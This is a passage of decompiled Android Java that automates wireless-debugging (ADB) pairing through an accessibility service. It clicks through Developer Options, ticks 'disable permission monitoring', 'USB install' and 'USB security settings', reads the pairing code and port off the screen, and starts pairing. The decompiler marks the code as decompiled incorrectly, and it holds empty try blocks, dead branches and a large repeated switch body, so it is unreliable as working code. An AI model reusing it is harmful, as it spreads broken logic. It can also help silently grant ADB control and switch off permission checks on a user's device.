                                                uiObject2 = null;
                                            } catch (Exception e9) {
                                                e = e9;
                                                uiObject2 = null;
                                            }
                                            while (uiObject2 == null) {
                                                try {
                                                } catch (Exception e10) {
                                                    e = e10;
                                                    AbstractC0026q.m186s("PairAccessibilityDelegate", e);
                                                    uiObject3 = uiObject2;
                                                    if (uiObject3 != null) {
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str6);
                                                    return;
                                                }
                                                if (a0Var.m1072k() != null) {
                                                    uiObject2 = a0Var.m1072k().findOneByCombine(u02);
                                                    AbstractC0251g.T0(5);
                                                } else {
                                                    if (uiObject2 != null) {
                                                        Log.d("PairAccessibilityDelegate", "使用配对码配对栏目查找成功");
                                                    }
                                                    uiObject3 = uiObject2;
                                                    if (uiObject3 != null) {
                                                        Log.d("PairAccessibilityDelegate", "使用配对码配对栏目查找成功");
                                                        AbstractC0184g.m354h(30);
                                                        UiObject findParentUtilCombine3 = uiObject3.findParentUtilCombine(a0.m987T());
                                                        if (findParentUtilCombine3 != null && findParentUtilCombine3.click()) {
                                                            Log.d("PairAccessibilityDelegate", "使用配对码配对栏目已点击");
                                                            AbstractC0184g.m354h(35);
                                                            break;
                                                        } else {
                                                            str6 = "使用配对码配对栏目点击失败";
                                                        }
                                                    } else {
                                                        str6 = "使用配对码配对栏目查找失败";
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str6);
                                                }
                                            }
                                            if (uiObject2 != null) {
                                            }
                                            uiObject3 = uiObject2;
                                            if (uiObject3 != null) {
                                            }
                                            Log.e("PairAccessibilityDelegate", str6);
                                        }
                                    } catch (Exception e11) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e11);
                                        return;
                                    }
                                    break;
                                case 5:
                                    a0Var.getClass();
                                    try {
                                        boolean m996M = a0Var.m996M();
                                        AtomicReference atomicReference3 = a0Var.f841p;
                                        String str7 = a0Var.f864c;
                                        if (m996M && !a0Var.m1000Q() && !Objects.equals(atomicReference3.get(), enumC0894g3)) {
                                            Object obj2 = atomicReference3.get();
                                            EnumC0894g enumC0894g4 = EnumC0894g.PAIR_DEPT_PAIRING;
                                            if (!Objects.equals(obj2, enumC0894g4)) {
                                                Log.d("PairAccessibilityDelegate", "pairInPairCodeDialog 窗口匹配");
                                                a0Var.m1062G();
                                                Log.d("PairAccessibilityDelegate", "active root complete");
                                                atomicReference3.set(enumC0894g4);
                                                Future m592b = AbstractC0243l.m592b(new CallableC0239h(a0Var), str7);
                                                if (m592b != null) {
                                                    while (!m592b.isDone()) {
                                                        Log.d("PairAccessibilityDelegate", "正在读取配对码和配对端口");
                                                        AbstractC0251g.T0(2);
                                                    }
                                                    try {
                                                        PairPortAndCodeResult pairPortAndCodeResult = (PairPortAndCodeResult) m592b.get();
                                                        if (pairPortAndCodeResult != null) {
                                                            Log.d("PairAccessibilityDelegate", "读取配对码和配对端口完成");
                                                            AbstractC0184g.m354h(40);
                                                            if (C0318e.m844S() != null) {
                                                                Log.d("PairAccessibilityDelegate", "正在发起配对");
                                                                C0318e.m844S().f615m.set(false);
                                                                C0318e.m844S().m852K(pairPortAndCodeResult.getHost(), pairPortAndCodeResult.getPairPort().intValue(), pairPortAndCodeResult.getPairCode());
                                                                if (C0318e.m844S().m860U()) {
                                                                    Log.d("PairAccessibilityDelegate", "本次配对成功");
                                                                    AbstractC0184g.m354h(45);
                                                                    atomicReference3.set(enumC0894g3);
                                                                } else {
                                                                    Log.d("PairAccessibilityDelegate", "本次配对失败");
                                                                }
                                                            }
                                                        } else {
                                                            Log.e("PairAccessibilityDelegate", "读取配对码和配对端口失败");
                                                        }
                                                    } catch (Exception e12) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e12);
                                                    }
                                                }
                                            }
                                        }
                                        if (!Objects.equals(atomicReference3.get(), enumC0894g3)) {
                                            atomicReference3.set(EnumC0894g.PAIR_DEPT_PAIR_FAIL);
                                        }
                                        if (a0Var.m996M()) {
                                            Log.e("PairAccessibilityDelegate", "配对结束,仍然停留在配对码窗口");
                                            if (atomicReference3.get() != enumC0894g3) {
                                                z6 = false;
                                            }
                                            AbstractC0243l.m592b(new CallableC0238g(z6, a0Var), str7);
                                            break;
                                        }
                                    } catch (Exception e13) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e13);
                                        return;
                                    }
                                    break;
                                case 6:
                                    a0Var.getClass();
                                    while (a0Var.m997N()) {
                                        try {
                                            UiObject findOneByCombine3 = a0Var.m1072k().findOneByCombine(a0.m989V());
                                            if (findOneByCombine3 != null && findOneByCombine3.click()) {
                                                Log.d("PairAccessibilityDelegate", "配对失败对话框确定按钮查找并点击完成");
                                                AbstractC0251g.T0(10);
                                            }
                                        } catch (Exception e14) {
                                            AbstractC0026q.m186s("PairAccessibilityDelegate", e14);
                                            return;
                                        }
                                    }
                                    ConcurrentLinkedQueue concurrentLinkedQueue2 = a0Var.f840o;
                                    concurrentLinkedQueue2.remove("pairInWifiDebugWindow");
                                    concurrentLinkedQueue2.remove("pairInPairCodeDialog");
                                    concurrentLinkedQueue2.remove("pairInPairFailDialog");
                                    break;
                                case 7:
                                    a0Var.getClass();
                                    while (a0Var.m1078q(C0420i.m1117L())) {
                                        try {
                                            try {
                                                AbstractC0251g.F0(1);
                                                Log.d("PairAccessibilityDelegate", "GlobalActionAutomator back");
                                                Thread.sleep(100L);
                                            } catch (Exception e15) {
                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e15);
                                            }
                                            AbstractC0251g.T0(5);
                                        } catch (Exception e16) {
                                            AbstractC0026q.m186s("PairAccessibilityDelegate", e16);
                                        }
                                    }
                                    break;
                                default:
                                    a0Var.getClass();
                                    try {
                                        Log.d("PairAccessibilityDelegate", "pairInSecurityCenter 窗口匹配");
                                        UiObject findOneByCombine4 = a0Var.m1072k().findOneByCombine(a0.K0());
                                        if (findOneByCombine4 != null && findOneByCombine4.clickable() && findOneByCombine4.click()) {
                                            Log.d("PairAccessibilityDelegate", "USB安装设置窗口下一步按钮查找并点击完成");
                                            a0Var.f840o.remove("pairInSecurityCenter");
                                            break;
                                        } else {
                                            UiObject findOneByCombine5 = a0Var.m1072k().findOneByCombine(a0.J0());
                                            if (findOneByCombine5 != null) {
                                                Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮查找完成");
                                                if (findOneByCombine5.clickable()) {
                                                    Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮已可以点击");
                                                    if (findOneByCombine5.click()) {
                                                        Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮点击完成");
                                                        AbstractC0251g.T0(10);
                                                        while (true) {
                                                            try {
                                                            } catch (Exception e17) {
                                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e17);
                                                            }
                                                            if (a0Var.m1072k() != null && a0Var.m1072k().findOneByCombine(a0.L0()) != null) {
                                                                Log.d("PairAccessibilityDelegate", "当前处于USB安全设置对话框");
                                                                z3 = true;
                                                                if (z3) {
                                                                    a0Var.f846u = true;
                                                                    a0Var.D0();
                                                                    break;
                                                                } else {
                                                                    Log.d("PairAccessibilityDelegate", "正在开启USB安全设置....");
                                                                    AbstractC0251g.T0(5);
                                                                }
                                                            }
                                                            z3 = false;
                                                            if (z3) {
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    } catch (Exception e18) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e18);
                                        return;
                                    }
                                    break;
                            }
                        }
                    }, str3);
                    return;
                }
                return;
            }
            if (m999P()) {
                concurrentLinkedQueue.remove("pairInDevOption");
                concurrentLinkedQueue.remove("pairInPairCodeDialog");
                concurrentLinkedQueue.remove("pairInConfirmLock");
                if (atomicReference.get() == enumC0894g) {
                    if (concurrentLinkedQueue.contains("pairInPairSuccess")) {
                        return;
                    }
                    concurrentLinkedQueue.add("pairInPairSuccess");
                    final int i5 = 3;
                    runnable = new Runnable(this) { // from class: o.y

                        /* renamed from: b */
                        public final /* synthetic */ a0 f975b;

                        {
                            this.f975b = this;
                        }

                        /* JADX WARN: Removed duplicated region for block: B:107:0x01a8 A[Catch: Exception -> 0x01a4, TRY_LEAVE, TryCatch #14 {Exception -> 0x01a4, blocks: (B:102:0x0192, B:104:0x0198, B:107:0x01a8), top: B:101:0x0192 }] */
                        /* JADX WARN: Removed duplicated region for block: B:111:0x01b7 A[Catch: Exception -> 0x01e3, TryCatch #15 {Exception -> 0x01e3, blocks: (B:94:0x016e, B:96:0x0178, B:111:0x01b7, B:113:0x01c9, B:115:0x01cf, B:118:0x01df, B:123:0x01b1), top: B:93:0x016e }] */
                        /* JADX WARN: Removed duplicated region for block: B:120:0x01dd  */
                        /* JADX WARN: Removed duplicated region for block: B:216:0x0357 A[Catch: Exception -> 0x0369, TryCatch #6 {Exception -> 0x0369, blocks: (B:204:0x02e0, B:206:0x02e6, B:208:0x02f8, B:210:0x0313, B:212:0x0329, B:214:0x0338, B:216:0x0357, B:217:0x035f, B:219:0x0363, B:276:0x0351, B:278:0x0318), top: B:203:0x02e0, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:219:0x0363 A[Catch: Exception -> 0x0369, TRY_LEAVE, TryCatch #6 {Exception -> 0x0369, blocks: (B:204:0x02e0, B:206:0x02e6, B:208:0x02f8, B:210:0x0313, B:212:0x0329, B:214:0x0338, B:216:0x0357, B:217:0x035f, B:219:0x0363, B:276:0x0351, B:278:0x0318), top: B:203:0x02e0, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:241:0x03fe A[Catch: Exception -> 0x0409, TryCatch #5 {Exception -> 0x0409, blocks: (B:228:0x0384, B:230:0x038a, B:232:0x039d, B:234:0x03b8, B:236:0x03ce, B:238:0x03dd, B:239:0x03fa, B:241:0x03fe, B:243:0x0403, B:268:0x03f6, B:270:0x03bd), top: B:227:0x0384, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:243:0x0403 A[Catch: Exception -> 0x0409, TRY_LEAVE, TryCatch #5 {Exception -> 0x0409, blocks: (B:228:0x0384, B:230:0x038a, B:232:0x039d, B:234:0x03b8, B:236:0x03ce, B:238:0x03dd, B:239:0x03fa, B:241:0x03fe, B:243:0x0403, B:268:0x03f6, B:270:0x03bd), top: B:227:0x0384, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:246:0x0418 A[EXC_TOP_SPLITTER, SYNTHETIC] */
                        /* JADX WARN: Removed duplicated region for block: B:253:0x042e A[ADDED_TO_REGION] */
                        /* JADX WARN: Removed duplicated region for block: B:262:0x043b A[ADDED_TO_REGION, SYNTHETIC] */
                        /* JADX WARN: Removed duplicated region for block: B:318:0x04da A[Catch: Exception -> 0x04e9, LOOP:8: B:310:0x04b8->B:318:0x04da, LOOP_END, TryCatch #4 {Exception -> 0x04e9, blocks: (B:295:0x0460, B:297:0x0473, B:299:0x0479, B:301:0x047f, B:303:0x048c, B:305:0x049a, B:307:0x04a5, B:309:0x04b0, B:318:0x04da, B:320:0x04e3, B:325:0x04d4, B:311:0x04b8, B:313:0x04be, B:315:0x04cc), top: B:294:0x0460, inners: #7 }] */
                        /* JADX WARN: Removed duplicated region for block: B:319:0x04e3 A[SYNTHETIC] */
                        @Override // java.lang.Runnable
                        /*
                            Code decompiled incorrectly, please refer to instructions dump.
                        */
                        public final void run() {
                            boolean z3;
                            boolean m998O;
                            UiObject findOneByCombine;
                            String str4;
                            boolean z4;
                            UiObject findOneByCombine2;
                            String str5;
                            boolean z5;
                            UiObject uiObject;
                            UiObject uiObject2;
                            UiObject uiObject3;
                            String str6;
                            CombineFilter u02;
                            EnumC0894g enumC0894g3 = EnumC0894g.PAIR_DEPT_PAIR_SUCCESS;
                            int i42 = i5;
                            boolean z6 = true;
                            a0 a0Var = this.f975b;
                            switch (i42) {
                                case 0:
                                    a0.m982H(a0Var);
                                    break;
                                case 1:
                                    a0.m982H(a0Var);
                                    break;
                                case 2:
                                    a0Var.getClass();
                                    try {
                                        if (a0.t0()) {
                                            a0Var.f841p.set(EnumC0894g.PAIR_DEPT_PAIR_PREPARE_FINISH);
                                            if (AbstractC0249e.m620i()) {
                                                AtomicInteger atomicInteger = new AtomicInteger(0);
                                                while (true) {
                                                    try {
                                                        UiObject f02 = a0Var.f0();
                                                        if (f02 != null && f02.canScrollForward()) {
                                                            f02.scrollForwardEnd();
                                                            a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                            AbstractC0251g.T0(5);
                                                            f02 = a0Var.f0();
                                                        }
                                                        if (f02 != null) {
                                                            uiObject = f02.canScrollBackward() ? f02.scrollBackwardUtil(a0.F0()) : null;
                                                            if (uiObject == null && f02.canScrollForward()) {
                                                                uiObject = f02.scrollForwardUtil(a0.F0());
                                                            }
                                                        } else {
                                                            uiObject = null;
                                                        }
                                                        if (uiObject != null && uiObject.parent() != null && a0Var.g0(uiObject.parent(), 20).isChecked()) {
                                                            a0Var.f844s = true;
                                                            Log.d("PairAccessibilityDelegate", "禁用权限监控已勾选");
                                                        }
                                                    } catch (Exception e2) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e2);
                                                    }
                                                    if (!a0Var.f844s && atomicInteger.incrementAndGet() <= 10) {
                                                        AbstractC0251g.T0(10);
                                                    }
                                                }
                                                AbstractC0184g.m354h(80);
                                                a0Var.D0();
                                            }
                                            if (AbstractC0249e.m624m()) {
                                                AtomicInteger atomicInteger2 = new AtomicInteger(0);
                                                while (true) {
                                                    try {
                                                        UiObject f03 = a0Var.f0();
                                                        if (f03 != null) {
                                                            Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
                                                            C0981d c0981d = new C0981d(a0.R0(), 2, 0);
                                                            findOneByCombine2 = f03.scrollForwardUtil(c0981d);
                                                            if (findOneByCombine2 == null) {
                                                                f03.scrollBackwardEnd();
                                                                a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                                AbstractC0251g.T0(5);
                                                                UiObject f04 = a0Var.f0();
                                                                if (f04 != null) {
                                                                    findOneByCombine2 = f04.scrollForwardUtil(c0981d);
                                                                }
                                                            }
                                                        } else {
                                                            Log.e("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找失败");
                                                            findOneByCombine2 = a0Var.m1072k().findOneByCombine(a0.R0());
                                                        }
                                                    } catch (Exception e3) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e3);
                                                    }
                                                    if (findOneByCombine2 != null) {
                                                        Log.d("PairAccessibilityDelegate", "USB安装栏目查找成功");
                                                        UiObject findParentUtilCombine = findOneByCombine2.findParentUtilCombine(a0.q0());
                                                        if (findParentUtilCombine != null) {
                                                            Log.d("PairAccessibilityDelegate", "USB安装可点击栏目查找成功");
                                                            CheckedResult e02 = a0.e0(findParentUtilCombine);
                                                            a0Var.f845t = e02.isChecked();
                                                            z5 = e02.isClicked();
                                                            if (z5) {
                                                                Log.d("PairAccessibilityDelegate", "USB安装已点击");
                                                                AbstractC0251g.T0(10);
                                                            }
                                                            if (a0Var.f845t) {
                                                                Log.d("PairAccessibilityDelegate", "USB安装已勾选");
                                                            }
                                                            if (a0Var.f845t && atomicInteger2.incrementAndGet() <= 10) {
                                                                AbstractC0251g.T0(10);
                                                            }
                                                        } else {
                                                            str5 = "USB安装可点击栏目查找失败";
                                                        }
                                                    } else {
                                                        str5 = "USB安装栏目查找失败";
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str5);
                                                    z5 = false;
                                                    if (z5) {
                                                    }
                                                    if (a0Var.f845t) {
                                                    }
                                                    if (a0Var.f845t) {
                                                    }
                                                }
                                                AbstractC0184g.m354h(70);
                                                atomicInteger2.set(0);
                                                while (true) {
                                                    try {
                                                        UiObject f05 = a0Var.f0();
                                                        if (f05 != null) {
                                                            Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
                                                            C0981d c0981d2 = new C0981d(a0.S0(), 3, 0);
                                                            findOneByCombine = f05.scrollForwardUtil(c0981d2);
                                                            if (findOneByCombine == null) {
                                                                f05.scrollBackwardEnd();
                                                                a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                                AbstractC0251g.T0(5);
                                                                UiObject f06 = a0Var.f0();
                                                                if (f06 != null) {
                                                                    findOneByCombine = f06.scrollForwardUtil(c0981d2);
                                                                }
                                                            }
                                                        } else {
                                                            Log.e("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找失败");
                                                            findOneByCombine = a0Var.m1072k().findOneByCombine(a0.S0());
                                                        }
                                                    } catch (Exception e4) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e4);
                                                    }
                                                    if (findOneByCombine != null) {
                                                        Log.d("PairAccessibilityDelegate", "USB安全设置栏目查找成功");
                                                        UiObject findParentUtilCombine2 = findOneByCombine.findParentUtilCombine(a0.q0());
                                                        if (findParentUtilCombine2 != null) {
                                                            Log.d("PairAccessibilityDelegate", "USB安全设置可点击栏目查找成功");
                                                            CheckedResult e03 = a0.e0(findParentUtilCombine2);
                                                            a0Var.f846u = e03.isChecked();
                                                            z4 = e03.isClicked();
                                                            if (a0Var.f846u) {
                                                                Log.d("PairAccessibilityDelegate", "USB安全设置已勾选");
                                                            }
                                                            if (z4) {
                                                                Log.d("PairAccessibilityDelegate", "USB安全设置点击成功");
                                                            }
                                                            AtomicInteger atomicInteger3222 = new AtomicInteger(10);
                                                            for (m998O = a0Var.m998O(); !m998O; m998O = a0Var.m998O()) {
                                                                try {
                                                                } catch (Exception e5) {
                                                                    AbstractC0026q.m186s("PairAccessibilityDelegate", e5);
                                                                }
                                                                if (atomicInteger3222.decrementAndGet() >= 0) {
                                                                    AbstractC0251g.T0(1);
                                                                } else if (!a0Var.f846u && !m998O && atomicInteger2.incrementAndGet() <= 10) {
                                                                    AbstractC0251g.T0(10);
                                                                }
                                                            }
                                                            if (!a0Var.f846u) {
                                                            }
                                                        } else {
                                                            str4 = "USB安全设置可点击栏目查找失败";
                                                        }
                                                    } else {
                                                        str4 = "USB安全设置栏目查找失败";
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str4);
                                                    z4 = false;
                                                    if (a0Var.f846u) {
                                                    }
                                                    if (z4) {
                                                    }
                                                    AtomicInteger atomicInteger32222 = new AtomicInteger(10);
                                                    while (!m998O) {
                                                    }
                                                    if (!a0Var.f846u) {
                                                    }
                                                }
                                                AbstractC0184g.m354h(80);
                                                if (a0Var.f846u) {
                                                    Log.d("PairAccessibilityDelegate", "USB安全设置已勾选");
                                                }
                                            }
                                            a0Var.f840o.remove("pairInPrepareFinish");
                                            break;
                                        }
                                        a0Var.D0();
                                        a0Var.f840o.remove("pairInPrepareFinish");
                                    } catch (Exception e6) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e6);
                                        return;
                                    }
                                    break;
                                case 3:
                                    a0Var.getClass();
                                    try {
                                        a0Var.f840o.remove("pairInPairSuccess");
                                        if (!a0.t0()) {
                                            a0Var.D0();
                                            break;
                                        } else {
                                            if (AbstractC0249e.m624m() && Build.VERSION.SDK_INT >= 35) {
                                                if (AbstractC0026q.m172b()) {
                                                    AbstractC0251g.T0(5);
                                                    if (!AbstractC0026q.m150A()) {
                                                        AbstractC0026q.m164O(null, null);
                                                    }
                                                }
                                                if (AbstractC0251g.f1()) {
                                                }
                                            }
                                            try {
                                                AbstractC0251g.F0(1);
                                                Log.d("PairAccessibilityDelegate", "GlobalActionAutomator back");
                                                Thread.sleep(100L);
                                                break;
                                            } catch (Exception e7) {
                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e7);
                                                return;
                                            }
                                        }
                                    } catch (Exception e8) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e8);
                                        return;
                                    }
                                    break;
                                case 4:
                                    AtomicReference atomicReference2 = a0Var.f841p;
                                    try {
                                        if (!Objects.equals(atomicReference2.get(), enumC0894g3)) {
                                            a0Var.m1062G();
                                            Log.d("PairAccessibilityDelegate", "active root complete");
                                            atomicReference2.set(EnumC0894g.PAIR_DEPT_PAIR_LEAVE_DEV_OPT);
                                            a0.m985R(a0Var.m1072k());
                                            try {
                                                u02 = a0.u0();
                                                uiObject2 = null;
                                            } catch (Exception e9) {
                                                e = e9;
                                                uiObject2 = null;
                                            }
                                            while (uiObject2 == null) {
                                                try {
                                                } catch (Exception e10) {
                                                    e = e10;
                                                    AbstractC0026q.m186s("PairAccessibilityDelegate", e);
                                                    uiObject3 = uiObject2;
                                                    if (uiObject3 != null) {
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str6);
                                                    return;
                                                }
                                                if (a0Var.m1072k() != null) {
                                                    uiObject2 = a0Var.m1072k().findOneByCombine(u02);
                                                    AbstractC0251g.T0(5);
                                                } else {
                                                    if (uiObject2 != null) {
                                                        Log.d("PairAccessibilityDelegate", "使用配对码配对栏目查找成功");
                                                    }
                                                    uiObject3 = uiObject2;
                                                    if (uiObject3 != null) {
                                                        Log.d("PairAccessibilityDelegate", "使用配对码配对栏目查找成功");
                                                        AbstractC0184g.m354h(30);
                                                        UiObject findParentUtilCombine3 = uiObject3.findParentUtilCombine(a0.m987T());
                                                        if (findParentUtilCombine3 != null && findParentUtilCombine3.click()) {
                                                            Log.d("PairAccessibilityDelegate", "使用配对码配对栏目已点击");
                                                            AbstractC0184g.m354h(35);
                                                            break;
                                                        } else {
                                                            str6 = "使用配对码配对栏目点击失败";
                                                        }
                                                    } else {
                                                        str6 = "使用配对码配对栏目查找失败";
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str6);
                                                }
                                            }
                                            if (uiObject2 != null) {
                                            }
                                            uiObject3 = uiObject2;
                                            if (uiObject3 != null) {
                                            }
                                            Log.e("PairAccessibilityDelegate", str6);
                                        }
                                    } catch (Exception e11) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e11);
                                        return;
                                    }
                                    break;
                                case 5:
                                    a0Var.getClass();
                                    try {
                                        boolean m996M = a0Var.m996M();
                                        AtomicReference atomicReference3 = a0Var.f841p;
                                        String str7 = a0Var.f864c;
                                        if (m996M && !a0Var.m1000Q() && !Objects.equals(atomicReference3.get(), enumC0894g3)) {
                                            Object obj2 = atomicReference3.get();
                                            EnumC0894g enumC0894g4 = EnumC0894g.PAIR_DEPT_PAIRING;
                                            if (!Objects.equals(obj2, enumC0894g4)) {
                                                Log.d("PairAccessibilityDelegate", "pairInPairCodeDialog 窗口匹配");
                                                a0Var.m1062G();
                                                Log.d("PairAccessibilityDelegate", "active root complete");
                                                atomicReference3.set(enumC0894g4);
                                                Future m592b = AbstractC0243l.m592b(new CallableC0239h(a0Var), str7);
                                                if (m592b != null) {
                                                    while (!m592b.isDone()) {
                                                        Log.d("PairAccessibilityDelegate", "正在读取配对码和配对端口");
                                                        AbstractC0251g.T0(2);
                                                    }
                                                    try {
                                                        PairPortAndCodeResult pairPortAndCodeResult = (PairPortAndCodeResult) m592b.get();
                                                        if (pairPortAndCodeResult != null) {
                                                            Log.d("PairAccessibilityDelegate", "读取配对码和配对端口完成");
                                                            AbstractC0184g.m354h(40);
                                                            if (C0318e.m844S() != null) {
                                                                Log.d("PairAccessibilityDelegate", "正在发起配对");
                                                                C0318e.m844S().f615m.set(false);
                                                                C0318e.m844S().m852K(pairPortAndCodeResult.getHost(), pairPortAndCodeResult.getPairPort().intValue(), pairPortAndCodeResult.getPairCode());
                                                                if (C0318e.m844S().m860U()) {
                                                                    Log.d("PairAccessibilityDelegate", "本次配对成功");
                                                                    AbstractC0184g.m354h(45);
                                                                    atomicReference3.set(enumC0894g3);
                                                                } else {
                                                                    Log.d("PairAccessibilityDelegate", "本次配对失败");
                                                                }
                                                            }
                                                        } else {
                                                            Log.e("PairAccessibilityDelegate", "读取配对码和配对端口失败");
                                                        }
                                                    } catch (Exception e12) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e12);
                                                    }
                                                }
                                            }
                                        }
                                        if (!Objects.equals(atomicReference3.get(), enumC0894g3)) {
                                            atomicReference3.set(EnumC0894g.PAIR_DEPT_PAIR_FAIL);
                                        }
                                        if (a0Var.m996M()) {
                                            Log.e("PairAccessibilityDelegate", "配对结束,仍然停留在配对码窗口");
                                            if (atomicReference3.get() != enumC0894g3) {
                                                z6 = false;
                                            }
                                            AbstractC0243l.m592b(new CallableC0238g(z6, a0Var), str7);
                                            break;
                                        }
                                    } catch (Exception e13) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e13);
                                        return;
                                    }
                                    break;
                                case 6:
                                    a0Var.getClass();
                                    while (a0Var.m997N()) {
                                        try {
                                            UiObject findOneByCombine3 = a0Var.m1072k().findOneByCombine(a0.m989V());
                                            if (findOneByCombine3 != null && findOneByCombine3.click()) {
                                                Log.d("PairAccessibilityDelegate", "配对失败对话框确定按钮查找并点击完成");
                                                AbstractC0251g.T0(10);
                                            }
                                        } catch (Exception e14) {
                                            AbstractC0026q.m186s("PairAccessibilityDelegate", e14);
                                            return;
                                        }
                                    }
                                    ConcurrentLinkedQueue concurrentLinkedQueue2 = a0Var.f840o;
                                    concurrentLinkedQueue2.remove("pairInWifiDebugWindow");
                                    concurrentLinkedQueue2.remove("pairInPairCodeDialog");
                                    concurrentLinkedQueue2.remove("pairInPairFailDialog");
                                    break;
                                case 7:
                                    a0Var.getClass();
                                    while (a0Var.m1078q(C0420i.m1117L())) {
                                        try {
                                            try {
                                                AbstractC0251g.F0(1);
                                                Log.d("PairAccessibilityDelegate", "GlobalActionAutomator back");
                                                Thread.sleep(100L);
                                            } catch (Exception e15) {
                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e15);
                                            }
                                            AbstractC0251g.T0(5);
                                        } catch (Exception e16) {
                                            AbstractC0026q.m186s("PairAccessibilityDelegate", e16);
                                        }
                                    }
                                    break;
                                default:
                                    a0Var.getClass();
                                    try {
                                        Log.d("PairAccessibilityDelegate", "pairInSecurityCenter 窗口匹配");
                                        UiObject findOneByCombine4 = a0Var.m1072k().findOneByCombine(a0.K0());
                                        if (findOneByCombine4 != null && findOneByCombine4.clickable() && findOneByCombine4.click()) {
                                            Log.d("PairAccessibilityDelegate", "USB安装设置窗口下一步按钮查找并点击完成");
                                            a0Var.f840o.remove("pairInSecurityCenter");
                                            break;
                                        } else {
                                            UiObject findOneByCombine5 = a0Var.m1072k().findOneByCombine(a0.J0());
                                            if (findOneByCombine5 != null) {
                                                Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮查找完成");
                                                if (findOneByCombine5.clickable()) {
                                                    Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮已可以点击");
                                                    if (findOneByCombine5.click()) {
                                                        Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮点击完成");
                                                        AbstractC0251g.T0(10);
                                                        while (true) {
                                                            try {
                                                            } catch (Exception e17) {
                                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e17);
                                                            }
                                                            if (a0Var.m1072k() != null && a0Var.m1072k().findOneByCombine(a0.L0()) != null) {
                                                                Log.d("PairAccessibilityDelegate", "当前处于USB安全设置对话框");
                                                                z3 = true;
                                                                if (z3) {
                                                                    a0Var.f846u = true;
                                                                    a0Var.D0();
                                                                    break;
                                                                } else {
                                                                    Log.d("PairAccessibilityDelegate", "正在开启USB安全设置....");
                                                                    AbstractC0251g.T0(5);
                                                                }
                                                            }
                                                            z3 = false;
                                                            if (z3) {
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    } catch (Exception e18) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e18);
                                        return;
                                    }
                                    break;
                            }
                        }
                    };
                } else {
                    if (concurrentLinkedQueue.contains("pairInWifiDebugWindow")) {
                        return;
                    }
                    concurrentLinkedQueue.add("pairInWifiDebugWindow");
                    final int i6 = 4;
                    runnable = new Runnable(this) { // from class: o.y

                        /* renamed from: b */
                        public final /* synthetic */ a0 f975b;

                        {
                            this.f975b = this;
                        }

                        /* JADX WARN: Removed duplicated region for block: B:107:0x01a8 A[Catch: Exception -> 0x01a4, TRY_LEAVE, TryCatch #14 {Exception -> 0x01a4, blocks: (B:102:0x0192, B:104:0x0198, B:107:0x01a8), top: B:101:0x0192 }] */
                        /* JADX WARN: Removed duplicated region for block: B:111:0x01b7 A[Catch: Exception -> 0x01e3, TryCatch #15 {Exception -> 0x01e3, blocks: (B:94:0x016e, B:96:0x0178, B:111:0x01b7, B:113:0x01c9, B:115:0x01cf, B:118:0x01df, B:123:0x01b1), top: B:93:0x016e }] */
                        /* JADX WARN: Removed duplicated region for block: B:120:0x01dd  */
                        /* JADX WARN: Removed duplicated region for block: B:216:0x0357 A[Catch: Exception -> 0x0369, TryCatch #6 {Exception -> 0x0369, blocks: (B:204:0x02e0, B:206:0x02e6, B:208:0x02f8, B:210:0x0313, B:212:0x0329, B:214:0x0338, B:216:0x0357, B:217:0x035f, B:219:0x0363, B:276:0x0351, B:278:0x0318), top: B:203:0x02e0, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:219:0x0363 A[Catch: Exception -> 0x0369, TRY_LEAVE, TryCatch #6 {Exception -> 0x0369, blocks: (B:204:0x02e0, B:206:0x02e6, B:208:0x02f8, B:210:0x0313, B:212:0x0329, B:214:0x0338, B:216:0x0357, B:217:0x035f, B:219:0x0363, B:276:0x0351, B:278:0x0318), top: B:203:0x02e0, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:241:0x03fe A[Catch: Exception -> 0x0409, TryCatch #5 {Exception -> 0x0409, blocks: (B:228:0x0384, B:230:0x038a, B:232:0x039d, B:234:0x03b8, B:236:0x03ce, B:238:0x03dd, B:239:0x03fa, B:241:0x03fe, B:243:0x0403, B:268:0x03f6, B:270:0x03bd), top: B:227:0x0384, outer: #0 }] */
